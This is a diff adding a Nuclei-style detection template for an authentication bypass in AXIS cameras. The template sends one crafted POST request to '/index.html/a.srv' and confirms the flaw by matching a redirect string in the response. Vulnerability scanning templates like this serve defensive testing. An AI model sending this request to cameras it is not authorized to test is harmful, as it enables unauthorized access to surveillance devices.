@@ -1,0 +1,23 @@
+id: poc-yaml-axis-camera-authorization-bypass
+info:
+  name: AXIS Camera Authorization Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: authentication-bypass
+  description: |
+    Axis cameras are vulnerable to an authentication bypass vulnerability. Attackers can bypass authentication by sending an HTTP request with specific data.
+
+http:
+  - raw:
+      - |
+        POST /index.html/a.srv HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        actoin=abc&return_page=it_worked
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Continue to <a href=\"it_worked\">it_worked</a>"
